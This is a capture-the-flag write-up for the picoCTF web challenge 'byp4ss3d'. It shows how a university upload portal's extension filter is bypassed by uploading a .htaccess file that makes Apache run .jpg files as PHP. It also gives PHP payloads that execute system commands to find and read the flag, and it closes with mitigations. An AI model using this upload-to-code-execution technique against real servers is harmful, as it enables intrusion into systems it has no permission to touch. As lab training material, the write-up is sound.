ğŸ“Œ picoCTF â€“ byp4ss3d Writeup

Author: Yahaya Meddy
Category: Web Exploitation
Difficulty: Easyâ€“Medium
Vulnerability Type: Insecure File Upload â†’ Apache Handler Abuse â†’ Remote Code Execution

ğŸ§¾ Challenge Description

A university's online registration portal asks students to upload their ID cards for verification.
The developer put some filters in place to ensure only image files are uploaded â€” but are they enough?
Take a look at how the upload is implemented. Maybe there's a way to slip past the checks and interact with the server in ways you shouldn't.

ğŸ¯ Objective

Bypass the image upload restrictions and gain unintended interaction with the server â€” ultimately retrieving the flag.

ğŸ§  Threat Model & Vulnerability Analysis

The application:

Accepts only .jpg image uploads

Implements basic extension filtering

Does not restrict .htaccess uploads

Runs on Apache

âš ï¸ Critical issue:
If .htaccess files are allowed inside the upload directory, an attacker can override Apache behavior and change how file types are handled.

This opens the door for executing arbitrary PHP code disguised as images.

ğŸ› ï¸ Exploitation Process
1ï¸âƒ£ Initial Recon â€“ Finding the Flag Location

Create a file named:

malicious.jpg


Insert:

<?php echo system("find / -name flag* 2>/dev/null"); ?>


This searches the entire filesystem for files starting with flag.

2ï¸âƒ£ Bypassing Image Restriction via .htaccess

Create:

.htaccess


With:

<Files "malicious.jpg">
AddHandler application/x-httpd-php .jpg
</Files>


ğŸ” What this does:

Forces Apache to interpret malicious.jpg as PHP

Overrides default file handling inside the directory

Upload both files.

3ï¸âƒ£ Achieving Code Execution

Visit:

http://target/uploads/malicious.jpg


The server executes the PHP code.

Output reveals:

/var/www/flag.txt


Now we know the exact flag location.

4ï¸âƒ£ Reading the Flag

Create a new file:

solve.jpg


Insert:

<?php echo system("cat /var/www/flag.txt"); ?>


Update .htaccess:

<Files "solve.jpg">
AddHandler application/x-httpd-php .jpg
</Files>


Re-upload .htaccess.

5ï¸âƒ£ Final Step

Visit:

http://target/uploads/solve.jpg


ğŸ‰ The flag is displayed.

ğŸ§© Why This Worked

The developer relied only on file extension filtering, but:

Apache allows per-directory configuration via .htaccess

Upload directory allowed execution

No content-type validation was enforced

No execution restrictions were set

This allowed us to convert a harmless image upload into Remote Code Execution.

ğŸ” Proper Mitigation

To prevent this vulnerability:

Disable .htaccess in upload directories (AllowOverride None)

Store uploads outside web root

Validate file MIME types server-side

Strip executable permissions from upload directories

ğŸ Conclusion

This challenge demonstrates how:

File upload + weak validation + misconfigured Apache
= Full Remote Code Execution
